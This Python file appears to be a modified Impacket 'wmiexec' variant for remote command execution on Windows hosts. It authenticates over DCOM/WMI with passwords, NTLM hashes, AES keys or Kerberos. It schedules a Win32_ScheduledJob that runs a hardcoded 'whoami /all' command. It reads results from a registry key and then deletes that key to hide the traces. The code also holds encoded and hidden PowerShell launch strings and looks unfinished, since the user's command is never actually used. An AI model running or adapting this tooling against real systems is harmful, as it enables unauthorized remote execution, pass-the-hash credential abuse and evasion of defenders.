'''
wmiexec-reg
execute command in target (do not connect to smb server)-- done
write command result into C:\windows\temp to registry
query result
HKEY_CLASSES_ROOT = -2147483648
HKEY_CURRENT_USER = -2147483649
HKEY_LOCAL_MACHINE = -2147483650
HKEY_USERS = -2147483651
HKEY_CURRENT_CONFIG = -2147483653
SELECT * FROM CIM_DataFile where name= "C:\\1.txt"
'''

from __future__ import division
from __future__ import print_function
import re
import sys
import os
import cmd
import argparse
import time
import logging
import ntpath
import datetime
from base64 import b64encode

from impacket.examples import logger
from impacket.examples.utils import parse_target
from impacket import version
from impacket.dcerpc.v5.dcomrt import DCOMConnection, COMVERSION
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dtypes import NULL
from impacket.krb5.keytab import Keytab
from impacket.dcerpc.v5 import transport, rrp, scmr, rpcrt
from impacket.system_errors import ERROR_NO_MORE_ITEMS
from impacket.structure import hexdump
from six import PY2
from time import gmtime, strftime
import uuid
import base64

OUTPUT_FILENAME = '__' + str(time.time())
CODEC = sys.stdout.encoding

class WMIEXEC:
    def __init__(self, command='', username='', password='', domain='', hashes=None, aesKey=None,
                doKerberos=False, kdcHost=None, shell_type=None):
        self.__command = command
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = aesKey
        self.__doKerberos = doKerberos
        self.__kdcHost = kdcHost
        self.__shell_type = shell_type
        self.shell = None
        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split(':')

    def run(self, addr):

        dcom = DCOMConnection(addr, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                              self.__aesKey, oxidResolver=True, doKerberos=self.__doKerberos, kdcHost=self.__kdcHost)
        try:
            iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
            iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
            iWbemServices = iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
            iWbemLevel1Login.RemRelease()
            win32ScheduledJob, _ = iWbemServices.GetObject('Win32_ScheduledJob')

            self.shell = RemoteShell( win32ScheduledJob , self.__shell_type, iWbemServices)
            if self.__command != ' ':
                self.shell.onecmd(self.__command)
            else:
                print("[-] give me command that you want")
        except  (Exception, KeyboardInterrupt) as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(str(e))
            dcom.disconnect()
            sys.stdout.flush()
            sys.exit(1)
        
        dcom.disconnect()

class RemoteShell(cmd.Cmd):
    def __init__(self, win32ScheduledJob , shell_type, iWbemServices):
        cmd.Cmd.__init__(self)
        self.__output = '\\' + OUTPUT_FILENAME
        self.__outputBuffer = str('')
        #self.__shell = 'cmd.exe /Q /c '
        self.__shell = 'cmd.exe /Q /c '
        self.__shell_type = shell_type
        #self.__pwsh = 'powershell.exe -NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc '
        self.__pwsh = 'powershell.exe -Enc '
        #self.__win32Process = win32Process
        self.__win32ScheduledJob = win32ScheduledJob
        self.iWbemServices = iWbemServices
        self.__pwd = str('C:\\')

    def do_EOF(self, s):
        print()
        return self.do_exit(s)

    def emptyline(self):
        return False
    
    def default(self, line):
        if line != '':
            self.send_data(line)
        else:
            print("[-] give me command that you want")
    
    def encodeCommand(self, data):
        data = '$ProgressPreference="SilentlyContinue";' + data
        #print(data)
        data = self.__pwsh + b64encode(data.encode('utf-16le')).decode()
        return data

    def execute_remote(self, data, shell_type='powershell'):
        self.scheduled_Job()

    def scheduled_Job(self):
        sql1 = "SELECT * FROM Win32_LocalTime"
        sql2 = "SELECT * FROM Win32_TimeZone"
        #namespace = '//%s/root/cimv2' % address
        iEnumWbemClassObject = self.iWbemServices.ExecQuery(sql1.strip('\n'))
        execute_time = self.printReply(iEnumWbemClassObject,func_type="LocalTime")
        iEnumWbemClassObject = self.iWbemServices.ExecQuery(sql2.strip('\n'))
        bias = self.printReply(iEnumWbemClassObject,func_type="TimeZone")
        executeTime = "********" + str(execute_time).replace(":",'') + ".000000+" + str(bias)
        #executeTime = "********043000.000000+480"
        command = r"c:\windows\system32\cmd.exe /c whoami /all > c:\sys.txt"
        #scheduled_Job, _ = self.iWbemServices.GetObject('Win32_ScheduledJob')
        self.__win32ScheduledJob.Create(command, executeTime, False, 0 , 0 , True)
        iEnumWbemClassObject.RemRelease()

    def send_data(self, data):
        self.execute_remote(data, self.__shell_type)
        print("[+] Command done")

    def printReply(self, iEnum, func_type):
        printHeader = True
        while True:
            try:
                pEnum = iEnum.Next(0xffffffff,1)[0]
                record = pEnum.getProperties()
                if func_type == "LocalTime":
                    Hour = int(record['Hour']['value'])
                    Minute = int(record['Minute']['value'])
                    Second = int(record['Second']['value'])
                    Machine_Date = datetime.datetime(100,1,1,Hour,Minute,Second)
                    print("[+] Target current time is: " + str(Machine_Date.time()))
                    execute_time = Machine_Date + datetime.timedelta(0,60)
                    executeTime = execute_time.time()
                    print("[+] Command will be executing at: " + str(executeTime))
                    return executeTime
                elif func_type == "TimeZone":
                    bias = record['Bias']['value']
                    print("[+] Timezone bias is: " + str(bias))
                    return bias
            except Exception as e:
                if logging.getLogger().level == logging.DEBUG:
                    import traceback
                    traceback.print_exc()
                if str(e).find('S_FALSE') < 0:
                    raise
                else:
                    break
        iEnum.RemRelease() 

    def queryWQL_ProcessCreate(self, keyName):
        #namespace = '//%s/root/default' % address
        descriptor, _ = self.iWbemServices.GetObject('StdRegProv')
        descriptor = descriptor.SpawnInstance()
        retVal = descriptor.GetStringValue(2147483650,'SOFTWARE\\classes\\hello', keyName)
        print("[+] Get result:")
        result = retVal.sValue
        print(base64.b64decode(result).decode('utf-16le'))
        print("[+] Remove registry Key")
        retVal = descriptor.DeleteKey(2147483650,'SOFTWARE\\classes\\hello')
        descriptor.RemRelease()
        #self.iWbemServices.RemRelease()

if __name__ == '__main__':
    print(version.BANNER)

    parser = argparse.ArgumentParser(add_help=True, description="Executes a semi-interactive shell using Windows "
                                                                "Management Instrumentation.")
    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-codec', action='store', help='Sets encoding used (codec) from the target\'s output (default '
                                                       '"%s"). If errors are detected, run chcp.com at the target, '
                                                       'map the result with '
                                                       'https://docs.python.org/3/library/codecs.html#standard-encodings and then execute wmiexec.py '
                                                       'again with -codec and the corresponding codec ' % CODEC)
    parser.add_argument('-shell-type', action='store', default='powershell', choices=['cmd', 'powershell'],
                        help='choose a command processor for the semi-interactive shell')
    parser.add_argument('-com-version', action='store', metavar="MAJOR_VERSION:MINOR_VERSION",
                        help='DCOM version, format is MAJOR_VERSION:MINOR_VERSION e.g. 5.7')
    parser.add_argument('command', nargs='*', default=' ', help='command to execute at the target. If empty it will '
                                                                'launch a semi-interactive shell')

    group = parser.add_argument_group('authentication')

    group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true",
                       help='Use Kerberos authentication. Grabs credentials from ccache file '
                            '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the '
                            'ones specified in the command line')
    group.add_argument('-aesKey', action="store", metavar="hex key", help='AES key to use for Kerberos Authentication '
                                                                          '(128 or 256 bits)')
    group.add_argument('-dc-ip', action='store', metavar="ip address", help='IP Address of the domain controller. If '
                                                                            'ommited it use the domain part (FQDN) specified in the target parameter')
    group.add_argument('-keytab', action="store", help='Read keys for SPN from keytab file')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    # Init the example's logger theme
    logger.init(options.ts)

    if options.codec is not None:
        CODEC = options.codec
    else:
        if CODEC is None:
            CODEC = 'utf-8'

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    if options.com_version is not None:
        try:
            major_version, minor_version = options.com_version.split('.')
            COMVERSION.set_default_version(int(major_version), int(minor_version))
        except Exception:
            logging.error("Wrong COMVERSION format, use dot separated integers e.g. \"5.7\"")
            sys.exit(1)

    domain, username, password, address = parse_target(options.target)

    try:

        if domain is None:
            domain = ''

        if options.keytab is not None:
            Keytab.loadKeysFromKeytab(options.keytab, username, domain, options)
            options.k = True

        if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
            from getpass import getpass

            password = getpass("Password:")

        if options.aesKey is not None:
            options.k = True

        executer = WMIEXEC(' '.join(options.command), username, password, domain, options.hashes, options.aesKey
                           ,options.k, options.dc_ip, options.shell_type)
        executer.run(address)
    except KeyboardInterrupt as e:
        logging.error(str(e))
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback

            traceback.print_exc()
        logging.error(str(e))
        sys.exit(1)

    sys.exit(0)
